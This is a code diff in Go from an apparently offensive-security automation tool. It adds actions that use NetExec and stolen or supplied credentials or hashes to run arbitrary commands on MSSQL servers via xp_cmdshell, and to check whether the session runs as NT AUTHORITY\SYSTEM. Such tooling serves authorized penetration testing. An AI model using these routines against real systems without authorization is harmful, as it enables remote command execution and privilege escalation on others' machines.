@@ -152,6 +152,42 @@ func executeAction(ctx context.Context, target core.HostRef, domain, user, pass,
 		return withEvidence(core.ActionResult{Success: true, Output: r.Stdout, Stderr: r.Stderr, Method: r.Method, ExitCode: r.ExitCode},
 			core.NewRunFailoverEvidence(target, action, cmd, r.Method, r.Stdout, r.Stderr, r.ExitCode))
 
+	case "mssql_run":
+		t := nxcTarget(target, "mssql", domain, user, pass, hash)
+		cmd := action.Artifact
+		if len(action.Arguments) > 0 {
+			cmd = action.Artifact + " " + strings.Join(action.Arguments, " ")
+		}
+		escapedCmd := strings.ReplaceAll(cmd, "'", "''")
+		r, err := tools.NetExec.Run(ctx, t, "-q", []string{fmt.Sprintf("xp_cmdshell '%s'", escapedCmd)})
+		if err != nil {
+			return withEvidence(core.ActionResult{Success: false, Error: err.Error(), Output: r.Stdout, Stderr: r.Stderr, Method: "mssql_xp_cmdshell", ExitCode: r.ExitCode},
+				core.NewRunFailoverEvidence(target, action, cmd, "mssql_xp_cmdshell", r.Stdout, r.Stderr, r.ExitCode))
+		}
+		// nxc exits 0 when the SQL query runs, even if xp_cmdshell fails.
+		// Check for actual output evidence beyond protocol framing
+		// (the 4th tab-separated column contains the cmd output).
+		success := mssqlHasOutput(r.Stdout)
+		return withEvidence(core.ActionResult{Success: success, Output: r.Stdout, Stderr: r.Stderr, Method: "mssql_xp_cmdshell", ExitCode: r.ExitCode},
+			core.NewRunFailoverEvidence(target, action, cmd, "mssql_xp_cmdshell", r.Stdout, r.Stderr, r.ExitCode))
+
+	case "mssql_system_check":
+		t := nxcTarget(target, "mssql", domain, user, pass, hash)
+		r, err := tools.NetExec.Run(ctx, t, "-q", []string{"xp_cmdshell 'whoami'"})
+		if err != nil {
+			return withEvidence(core.ActionResult{Success: false, Error: err.Error()},
+				core.NewSystemCheckFailedEvidence(target, action))
+		}
+		lo := strings.ToLower(r.Stdout + r.Stderr)
+		isSystem := strings.Contains(lo, "nt authority") && strings.Contains(lo, "system")
+		method := "mssql_xp_cmdshell"
+		if isSystem {
+			return withEvidence(core.ActionResult{Success: true, Output: r.Stdout, Method: method},
+				core.NewSystemCheckEvidence(target, action, method, r.Stdout, r.Stderr, r.ExitCode))
+		}
+		return withEvidence(core.ActionResult{Success: false, Output: r.Stdout, Stderr: r.Stderr, Method: method},
+			core.NewSystemCheckFailedEvidence(target, action))
+
 	case "system_check":
 		t := nxcTarget(target, "smb", domain, user, pass, hash)
 		method, r, ok := runSystemCheck(ctx, t, timeout)
@@ -261,6 +297,30 @@ func hasNxcFailureMarker(out, username string) bool {
 			if strings.Contains(lo, m) {
 				return true
 			}
+		}
+	}
+	return false
+}
+
+// mssqlHasOutput checks whether nxc mssql -q returned actual command output.
+// nxc mssql outputs tab-separated rows:
+//
+//	MSSQL\tIP\tPORT\tHOST\t<cmd_output>
+//
+// Returns true when at least one row contains real output (not NULL).
+func mssqlHasOutput(stdout string) bool {
+	for _, line := range strings.Split(stdout, "\n") {
+		parts := strings.Split(line, "\t")
+		if len(parts) < 5 {
+			continue
+		}
+		msg := strings.TrimSpace(parts[len(parts)-1])
+		// Strip "output:" prefix and check for NULL
+		if strings.HasPrefix(msg, "output:") {
+			msg = strings.TrimSpace(msg[7:])
+		}
+		if msg != "" && !strings.EqualFold(msg, "NULL") {
+			return true
 		}
 	}
 	return false
